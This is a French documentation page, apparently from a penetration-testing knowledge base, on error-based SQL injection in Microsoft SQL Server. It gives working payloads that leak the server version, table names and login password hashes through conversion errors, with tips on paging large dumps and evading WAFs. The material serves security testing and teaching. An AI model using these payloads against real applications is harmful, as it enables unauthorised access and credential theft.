---
order: 4
title: "Injection SQL basée sur les erreurs dans MSSQL"
description: "Divulguer les résultats de requête SQL Server via des erreurs de conversion de type, qui citent la valeur fautive dans le message sans limite de longueur."
keywords:
  - injection SQL basée sur les erreurs
  - conversion failed
  - CONVERT CAST
  - fuite d'erreur MSSQL
---

# Basée sur les erreurs

Lorsque l'application masque les lignes mais reflète les erreurs de base de données, SQL Server divulgue les données via un échec de conversion de type. Convertir une chaîne en `int` lève `Conversion failed when converting the varchar value '<value>' to data type int`, et le message cite la valeur qui a échoué, de sorte qu'une sous-requête placée dans la conversion affiche son résultat.

Placez la sous-requête dans un `CONVERT` (ou `CAST`) vers `int` :

```sql
' AND 1=CONVERT(int,(SELECT @@version))-- 
```

La réponse porte `Conversion failed when converting the varchar value 'Microsoft SQL Server 2019 ...' to data type int`. Toute sous-requête à valeur unique fonctionne :

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- 
' AND 1=CONVERT(int,(SELECT TOP 1 name+':'+master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins))-- 
```

Notez qu'un hachage de mot de passe est `varbinary` : rendez-le avec `fn_varbintohexstr` (ou `CONVERT(varchar(max), hash, 2)`) plutôt qu'un simple `CAST` en `varchar`, qui réinterpréterait les octets bruts comme du texte et produirait une sortie inutilisable contenant des NUL.

Contrairement au canal XPath de MySQL, SQL Server ne plafonne pas la valeur à ~32 caractères, donc une ligne revient généralement en une seule erreur. Ce n'est toutefois pas illimité : les messages d'erreur ont une longueur finie et une valeur ou un agrégat très long peut être tronqué, donc pour les gros dumps lisez par fenêtres avec `SUBSTRING((SELECT ...),1,2000)` et paginez. Gardez la requête interne à une valeur unique avec `TOP 1` ou un agrégat, puisqu'une sous-requête multi-lignes utilisée comme scalaire lève une erreur différente qui ne porte aucune donnée.

## Outils

- **sqlmap** : extraction automatisée basée sur les erreurs via les échecs de conversion.
- **ghauri** : alternative rapide avec forte évasion de WAF.

## Références

- Microsoft SQL Server Documentation : CONVERT and CAST, data type conversion
- OWASP Testing Guide : Testing for SQL Injection
